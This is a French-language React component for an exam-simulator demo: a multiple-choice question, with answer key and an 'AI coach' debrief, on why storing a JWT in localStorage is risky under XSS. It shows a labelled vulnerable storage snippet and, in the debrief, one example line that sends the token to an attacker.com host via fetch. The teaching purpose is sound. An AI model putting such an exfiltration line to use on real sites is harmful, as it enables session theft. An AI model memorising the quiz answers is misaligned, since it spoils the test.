'use client';

import { useState } from 'react';
import {
    Clock,
    Sparkles,
    CheckCircle2,
    XCircle,
    RotateCcw,
    Zap,
    Brain,
    Bot,
    ChevronRight,
    Terminal,
    Target
} from 'lucide-react';
import { Button } from '@/components/ui/button';
import { CodeBlock } from '@/components/cctl/CodeBlock';

export function InteractiveSimulatorDemo() {
    const [selectedAnswer, setSelectedAnswer] = useState<string | null>(null);
    const [isSubmitted, setIsSubmitted] = useState(false);
    const [showCoach, setShowCoach] = useState(false);

    const question = {
        title: "Sécurité Web & Authentification JWT",
        promo: "A3 • Informatique",
        domain: "Cybersécurité & Web",
        text: "Dans une architecture Next.js / Node.js, pourquoi le stockage d'un JSON Web Token (JWT) sensible dans le `localStorage` du navigateur est-il considéré comme une mauvaise pratique par l'OWASP ?",
        code: `// Exemple de stockage vulnérable
function onLoginSuccess(token: string) {
  localStorage.setItem('auth_token', token);
  // ⚠️ Vulnérabilité majeure face aux injections de scripts
}`,
        choices: [
            {
                id: 'A',
                text: "Parce que le localStorage est limité à 5 Ko et ne peut pas stocker de payload chiffré.",
                isCorrect: false,
                reason: "Le localStorage dispose d'environ 5 Mo de quota, la taille n'est pas la vulnérabilité de sécurité principale."
            },
            {
                id: 'B',
                text: "Parce que le localStorage est accessible par n'importe quel script JavaScript exécuté sur la page, le rendant vulnérable aux attaques XSS.",
                isCorrect: true,
                reason: "Exact ! Tout script malveillant injecté (XSS) peut lire `localStorage.getItem('auth_token')` et exfiltrer la session. La recommandation officielle est l'utilisation d'un cookie HTTP-Only, Secure et SameSite."
            },
            {
                id: 'C',
                text: "Parce que le localStorage est automatiquement purgé à chaque rechargement de page (F5).",
                isCorrect: false,
                reason: "Faux : le localStorage est persistant entre les recharges et sessions navigateur (contrairement au sessionStorage)."
            },
            {
                id: 'D',
                text: "Parce que le serveur ne peut pas déchiffrer un jeton envoyé depuis un stockage local.",
                isCorrect: false,
                reason: "Le jeton est transmis dans le header Authorization `Bearer <token>` indépendamment du lieu où le client le garde."
            }
        ]
    };

    const handleSelect = (id: string) => {
        if (isSubmitted) return;
        setSelectedAnswer(id);
    };

    const handleSubmit = () => {
        if (!selectedAnswer) return;
        setIsSubmitted(true);
    };

    const handleReset = () => {
        setSelectedAnswer(null);
        setIsSubmitted(false);
        setShowCoach(false);
    };

    const isCorrect = selectedAnswer === 'B';

    return (
        <div className="card-editorial rounded-3xl bg-surface-card border border-border p-6 sm:p-8 shadow-xl relative overflow-hidden space-y-6">
            {/* Header / Simulated Toolbar */}
            <div className="flex flex-wrap items-center justify-between gap-4 border-b border-border pb-4">
                <div className="flex items-center gap-2.5">
                    <span className="flex h-2.5 w-2.5 rounded-full bg-emerald-500 animate-pulse" />
                    <span className="font-mono text-xs uppercase tracking-wider font-semibold text-text-primary">
                        Démo Interactive en Direct • Simulateur CCTL
                    </span>
                </div>

                <div className="flex items-center gap-3 font-mono text-xs">
                    <div className="flex items-center gap-1.5 bg-surface px-3 py-1.5 rounded-xl border border-border text-accent-yellow font-bold">
                        <Clock className="w-3.5 h-3.5" />
                        <span>01:42 restant</span>
                    </div>
                    <span className="bg-surface px-2.5 py-1.5 rounded-xl border border-border text-text-secondary">
                        Question 1 / 1
                    </span>
                </div>
            </div>

            {/* Question Details */}
            <div className="space-y-4">
                <div className="flex flex-wrap items-center gap-2">
                    <span className="px-2.5 py-0.5 rounded-full bg-accent-yellow text-black font-bold text-[11px] uppercase tracking-wider">
                        {question.promo}
                    </span>
                    <span className="px-2.5 py-0.5 rounded-full bg-surface border border-border text-text-secondary text-[11px] font-mono">
                        {question.domain}
                    </span>
                    <span className="px-2.5 py-0.5 rounded-full bg-surface border border-border text-text-secondary text-[11px]">
                        Barème CESI : +1 pt / 0 pt
                    </span>
                </div>

                <h4 className="text-base sm:text-lg font-medium text-text-primary leading-snug">
                    {question.text}
                </h4>

                {/* Code Snippet */}
                {question.code && (
                    <div className="pt-1">
                        <CodeBlock code={question.code} language="typescript" />
                    </div>
                )}
            </div>

            {/* Choices */}
            <div className="space-y-2.5">
                {question.choices.map((choice) => {
                    const isChoiceActive = selectedAnswer === choice.id;
                    let style = 'border-border bg-surface/50 hover:bg-surface hover:border-text-secondary/40 text-text-primary';

                    if (isSubmitted) {
                        if (choice.isCorrect) {
                            style = 'border-emerald-500/80 bg-emerald-500/10 text-emerald-800 dark:text-emerald-300 font-bold';
                        } else if (isChoiceActive && !choice.isCorrect) {
                            style = 'border-red-500/80 bg-red-500/10 text-red-800 dark:text-red-300 font-bold';
                        } else {
                            style = 'border-border/60 bg-surface/30 text-text-secondary';
                        }
                    } else if (isChoiceActive) {
                        style = 'border-accent-yellow bg-accent-yellow/10 text-text-primary shadow-xs ring-1 ring-accent-yellow/50';
                    }

                    return (
                        <button
                            key={choice.id}
                            type="button"
                            onClick={() => handleSelect(choice.id)}
                            disabled={isSubmitted}
                            className={`w-full text-left p-3.5 sm:p-4 rounded-2xl border transition-all flex items-start gap-3.5 cursor-pointer ${style}`}
                        >
                            <span
                                className={`w-7 h-7 rounded-xl font-mono text-xs font-bold flex items-center justify-center shrink-0 transition-colors ${
                                    isSubmitted && choice.isCorrect
                                        ? 'bg-emerald-500/20 text-emerald-800 dark:bg-emerald-500/25 dark:text-emerald-200 border border-emerald-500/40'
                                        : isSubmitted && isChoiceActive && !choice.isCorrect
                                        ? 'bg-red-500/20 text-red-800 dark:bg-red-500/25 dark:text-red-200 border border-red-500/40'
                                        : isChoiceActive
                                        ? 'bg-accent-yellow text-black'
                                        : 'bg-surface border border-border text-text-secondary'
                                }`}
                            >
                                {isSubmitted && choice.isCorrect ? (
                                    <CheckCircle2 className="w-4 h-4" />
                                ) : isSubmitted && isChoiceActive && !choice.isCorrect ? (
                                    <XCircle className="w-4 h-4" />
                                ) : (
                                    choice.id
                                )}
                            </span>

                            <div className="flex-1 pt-0.5 text-xs sm:text-sm leading-relaxed">
                                {choice.text}
                            </div>
                        </button>
                    );
                })}
            </div>

            {/* Actions Bar */}
            <div className="flex flex-wrap items-center justify-between gap-4 pt-3 border-t border-border">
                <div className="text-xs text-text-secondary">
                    {!isSubmitted ? (
                        <span>Sélectionnez une réponse pour valider</span>
                    ) : (
                        <span className="flex items-center gap-1.5">
                            {isCorrect ? (
                                <>
                                    <CheckCircle2 className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                                    <span className="font-bold text-emerald-700 dark:text-emerald-400">Bonne réponse ! (+1.0 point)</span>
                                </>
                            ) : (
                                <>
                                    <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                                    <span className="font-bold text-red-700 dark:text-red-400">Réponse incorrecte (0.0 point)</span>
                                </>
                            )}
                        </span>
                    )}
                </div>

                <div className="flex items-center gap-2">
                    {!isSubmitted ? (
                        <Button
                            variant="premium"
                            size="sm"
                            onClick={handleSubmit}
                            disabled={!selectedAnswer}
                            className="gap-2 text-xs"
                        >
                            <span>Valider la réponse</span>
                            <ChevronRight className="w-3.5 h-3.5" />
                        </Button>
                    ) : (
                        <>
                            <Button
                                variant="outline"
                                size="sm"
                                onClick={handleReset}
                                className="gap-1.5 text-xs"
                            >
                                <RotateCcw className="w-3.5 h-3.5" />
                                <span>Recommencer</span>
                            </Button>

                            <Button
                                variant={showCoach ? 'secondary' : 'default'}
                                size="sm"
                                onClick={() => setShowCoach(!showCoach)}
                                className="gap-1.5 text-xs bg-accent-yellow text-black hover:bg-accent-yellow-hover"
                            >
                                <Sparkles className="w-3.5 h-3.5" />
                                <span>{showCoach ? 'Masquer le Coach IA' : 'Voir le Coach IA'}</span>
                            </Button>
                        </>
                    )}
                </div>
            </div>

            {/* Coach IA Drawer / Preview */}
            {isSubmitted && showCoach && (
                <div className="mt-4 p-5 rounded-2xl bg-surface border border-accent-yellow/30 space-y-4 animate-in fade-in slide-in-from-top-2 duration-300">
                    <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2 text-accent-yellow font-semibold text-xs uppercase tracking-wider font-mono">
                            <Bot className="w-4 h-4" />
                            <span>Débriefing Pédagogique du Coach IA</span>
                        </div>
                        <span className="text-[11px] font-mono text-text-muted bg-background px-2 py-0.5 rounded-md border border-border">
                            Modèle : Kompas Reasoning Core
                        </span>
                    </div>

                    <div className="space-y-3 text-xs sm:text-sm text-text-secondary leading-relaxed">
                        <p>
                            <strong className="text-text-primary">Pourquoi la réponse B est la bonne :</strong> L&apos;API <code className="px-1.5 py-0.5 rounded bg-background border border-border text-accent-yellow font-mono text-xs">localStorage</code> est synchronisée et non protégée contre les accès de premier niveau par le moteur de rendu JavaScript. En cas de faille Cross-Site Scripting (XSS), un script tiers injecté exécute un simple <code className="px-1.5 py-0.5 rounded bg-background border border-border font-mono text-xs">fetch(&apos;https://attacker.com/&apos; + localStorage.token)</code>.
                        </p>
                        <div className="p-3 rounded-xl bg-background/80 border border-border space-y-1.5">
                            <div className="flex items-center gap-1.5 text-xs font-semibold text-text-primary">
                                <Target className="w-3.5 h-3.5 text-accent-yellow" />
                                <span>Règle d&apos;or pour le CCTL CESI :</span>
                            </div>
                            <p className="text-xs text-text-muted">
                                Pour toute question portant sur la persistance de session sécurisée, privilégiez les <strong>cookies signés avec les attributs HttpOnly (inaccessible en JS), Secure (HTTPS uniquement) et SameSite=Strict / Lax</strong>.
                            </p>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}
